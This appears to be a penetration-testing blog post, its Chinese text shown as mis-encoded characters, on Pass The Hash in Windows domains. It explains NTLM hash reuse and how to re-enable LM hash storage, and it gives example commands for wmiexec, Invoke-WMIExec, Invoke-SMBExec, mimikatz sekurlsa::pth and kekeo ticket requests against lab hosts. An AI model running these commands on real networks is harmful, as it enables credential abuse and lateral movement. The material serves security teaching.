I" <h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¹‹å‰çš„æ–‡ç« ã€ŠåŸŸæ¸—é€â€”â€”Pass The Hash &amp; Pass The Keyã€‹æ›¾ä»‹ç»è¿‡kb2871997å¯¹Pass The Hashçš„å½±å“ã€‚æœ¬æ–‡å°†ç«™åœ¨å¦ä¸€ä¸ªè§’åº¦ï¼Œä»‹ç»Pass The Hashçš„ç›¸å…³å®ç°</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>Pass The Hashçš„åŸç†</li>
  <li>å¸¸ç”¨å·¥å…·</li>
  <li>mimikatzä¸­çš„Pass The Hash</li>
  <li>mimikatzä¸­çš„Pass The Ticket</li>
</ul>

<h2 id="0x02-pass-the-hashçš„åŸç†">0x02 Pass The Hashçš„åŸç†</h2>
<hr />

<p>å¯å‚è€ƒWikipediaçš„ä»‹ç»ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://en.wikipedia.org/wiki/Pass_the_hash</p>

<p>æå–å‡ºå…³é”®ä¿¡æ¯ï¼š</p>

<ul>
  <li>åœ¨Windowsç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä¼šä½¿ç”¨NTLMèº«ä»½è®¤è¯</li>
  <li>NTLMè®¤è¯ä¸ä½¿ç”¨æ˜æ–‡å£ä»¤ï¼Œè€Œæ˜¯ä½¿ç”¨å£ä»¤åŠ å¯†åçš„hashå€¼ï¼Œhashå€¼ç”±ç³»ç»ŸAPIç”Ÿæˆ(ä¾‹å¦‚LsaLogonUser)</li>
  <li>hashåˆ†ä¸ºLM hashå’ŒNT hashï¼Œå¦‚æœå¯†ç é•¿åº¦å¤§äº15ï¼Œé‚£ä¹ˆæ— æ³•ç”ŸæˆLM hashã€‚ä»Windows Vistaå’ŒWindows Server 2008å¼€å§‹ï¼Œå¾®è½¯é»˜è®¤ç¦ç”¨LM hash</li>
  <li>å¦‚æœæ”»å‡»è€…è·å¾—äº†hashï¼Œå°±èƒ½å¤Ÿåœ¨èº«ä»½éªŒè¯çš„æ—¶å€™æ¨¡æ‹Ÿè¯¥ç”¨æˆ·(å³è·³è¿‡è°ƒç”¨APIç”Ÿæˆhashçš„è¿‡ç¨‹)</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>mimikatzæ”¯æŒå¯¼å‡ºå†…å­˜ä¸­ç”¨æˆ·çš„LM hashï¼Œä½†å‰ææ˜¯Windowsç³»ç»Ÿæ”¯æŒLM hash</p>

<p>Windows Server 2008å¯ç”¨LM hashçš„æ–¹æ³•ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">gpedit.msc</code>-<code class="language-plaintext highlighter-rouge">è®¡ç®—æœºé…ç½®</code>-<code class="language-plaintext highlighter-rouge">Windows è®¾ç½®</code>-<code class="language-plaintext highlighter-rouge">å®‰å…¨è®¾ç½®</code>-<code class="language-plaintext highlighter-rouge">æœ¬åœ°ç­–ç•¥</code>-<code class="language-plaintext highlighter-rouge">å®‰å…¨é€‰é¡¹</code></p>

<p>æ‰¾åˆ°<code class="language-plaintext highlighter-rouge">ç½‘ç»œå®‰å…¨ï¸° ä¸è¦åœ¨ä¸‹æ¬¡æ›´æ”¹å¯†ç å­˜å‚¨ LAN ç®¡ç†å™¨çš„å“ˆå¸Œå€¼</code>ï¼Œé€‰æ‹©<code class="language-plaintext highlighter-rouge">å·²ç¦ç”¨</code></p>

<p>ç³»ç»Ÿä¸‹ä¸€æ¬¡æ›´æ”¹å¯†ç åï¼Œå°±èƒ½å¤Ÿå¯¼å‡ºLM hash</p>

<h2 id="0x03-å¸¸ç”¨å·¥å…·">0x03 å¸¸ç”¨å·¥å…·</h2>
<hr />

<p>å½“æˆ‘ä»¬è·å¾—æŸä¸ªç”¨æˆ·çš„å£ä»¤hashï¼Œå¹¶ä¸”æ¡ä»¶é™å®šæˆ‘ä»¬ä¸å»ç ´è§£æ˜æ–‡å£ä»¤ï¼Œå®ç°Pass The Hashéƒ½æœ‰å“ªäº›å·¥å…·å‘¢ï¼Ÿ</p>

<h3 id="1kaliä¸‹çš„å·¥å…·">1ã€Kaliä¸‹çš„å·¥å…·</h3>

<h4 id="1-meterpreter">(1) meterpreter</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/psexec_psh
</code></pre></div></div>

<h4 id="2-å·¥å…·é›†">(2) å·¥å…·é›†</h4>

<p>ä½äº<code class="language-plaintext highlighter-rouge">å¯†ç æ”»å‡»</code>-<code class="language-plaintext highlighter-rouge">Passing the Hash</code>ä¸‹ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/1215.png" alt="Alt text" /></p>

<p>åŒ…å«å¤šç§åˆ©ç”¨å·¥å…·</p>

<h3 id="2windowsç³»ç»Ÿä¸‹çš„å·¥å…·">2ã€Windowsç³»ç»Ÿä¸‹çš„å·¥å…·</h3>

<h4 id="1-python">(1) python</h4>

<p><strong>wmiexecï¼š</strong></p>

<p>å‚è€ƒåœ°å€ï¼š</p>

<p>https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</p>

<p>exeç‰ˆæœ¬ä¸‹è½½åœ°å€ï¼š</p>

<p>https://github.com/maaaaz/impacket-examples-windows</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>wmiexec.pyçš„æ³¨é‡Šä¸­æç¤ºâ€Main advantage here is it runs under the user (has to be Admin) accountâ€ï¼Œç»å®é™…æµ‹è¯•æ™®é€šç”¨æˆ·æƒé™å³å¯</p>

<p>å‚æ•°å®ä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 TEST/test1@192.168.1.1 "whoami"
</code></pre></div></div>

<p>wmiexec.pyçš„hashå‚æ•°æ ¼å¼ä¸º<code class="language-plaintext highlighter-rouge">LMHASH:NTHASH</code>ï¼Œç”±äºè¯¥Hashæ¥è‡ªäºServer 2008ï¼Œç³»ç»Ÿé»˜è®¤ä¸æ”¯æŒLM hashï¼Œæ‰€ä»¥LM hashå¯ä»¥è®¾å®šä¸ºä»»æ„å€¼</p>

<h4 id="2-powershell">(2) powershell</h4>

<p>å‚è€ƒåœ°å€ï¼š</p>

<p>https://github.com/Kevin-Robertson/Invoke-TheHash/</p>

<p>æ”¯æŒå¤šç§æ–¹å¼</p>

<p><strong>Invoke-WMIExecï¼š</strong></p>

<p>å‚æ•°å®ä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-WMIExec -Target 192.168.1.1 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
</code></pre></div></div>

<p>ç±»ä¼¼wmiexec.py</p>

<p><strong>Invoke-SMBExecï¼š</strong></p>

<p>æ”¯æŒSMB1, SMB2 (2.1), and SMB signing</p>

<p>å‚æ•°å®ä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
</code></pre></div></div>

<p>é€šè¿‡åœ¨ç›®æ ‡ä¸»æœºåˆ›å»ºæœåŠ¡æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥æƒé™ä¸ºsystem</p>

<p><strong>Invoke-SMBClientï¼š</strong></p>

<p>æ”¯æŒSMB1, SMB2 (2.1), and SMB signing</p>

<p>å¦‚æœåªæœ‰SMBæ–‡ä»¶å…±äº«çš„æƒé™ï¼Œæ²¡æœ‰è¿œç¨‹æ‰§è¡Œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è¯¥è„šæœ¬</p>

<p>æ”¯æŒçš„åŠŸèƒ½åŒ…æ‹¬åˆ—ä¸¾ç›®å½•ã€ä¸Šä¼ æ–‡ä»¶ã€ä¸‹è½½æ–‡ä»¶ã€åˆ é™¤æ–‡ä»¶(å…·ä½“æƒé™å–å†³äºè¯¥å£ä»¤hashçš„æƒé™)</p>

<h4 id="3-mimikatz">(3) mimikatz</h4>

<p><strong>Pass-The-Hashï¼š</strong></p>

<p>å®é™…ä¸Šä¸ºOverpass-the-hash</p>

<p>å‚æ•°å®ä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
sekurlsa::pth /user:test1 /domain:test.local /ntlm:c5a237b7e9d8e708d8436b6148a25fa1
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>mimikatzçš„pthåŠŸèƒ½éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œè¿™æ˜¯ç”±å®ƒçš„å®ç°æœºåˆ¶å†³å®šçš„ï¼Œéœ€è¦å…ˆè·å¾—é«˜æƒé™è¿›ç¨‹lsass.exeçš„ä¿¡æ¯</p>

<p>å¯¹äº8.1/2012r2ï¼Œå®‰è£…è¡¥ä¸kb2871997çš„Win 7/2008r2/8/2012ï¼Œå¯ä»¥ä½¿ç”¨AES keysä»£æ›¿NT hash</p>

<p><strong>Pass-The-Ticketï¼š</strong></p>

<p>è€ƒè™‘åˆ°mimikatzçš„pthåŠŸèƒ½éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œæ‰€ä»¥mimikatzä¹Ÿæä¾›äº†ä¸éœ€è¦ç®¡ç†å‘˜æƒé™çš„è§£å†³æ–¹æ³•Pass-The-Ticket</p>

<p>Pass-The-Ticketéœ€è¦ç”¨åˆ°gentilkiwiå¼€æºçš„å¦ä¸€æ¬¾å·¥å…·kekeoï¼Œä¸‹è½½åœ°å€ï¼š</p>

<p>https://github.com/gentilkiwi/kekeo</p>

<p>å‚æ•°å®ä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"
</code></pre></div></div>

<p>æ‰§è¡Œåç”Ÿæˆç¥¨æ®<code class="language-plaintext highlighter-rouge">TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi</code></p>

<p>æ¥ä¸‹æ¥å¯¼å…¥ç¥¨æ®ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"
</code></pre></div></div>

<h2 id="0x04-å°ç»“">0x04 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡åˆ—ä¸¾äº†å¤šç§å®ç°Pass The Hashçš„å·¥å…·ï¼Œæ¬¢è¿è¡¥å……</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET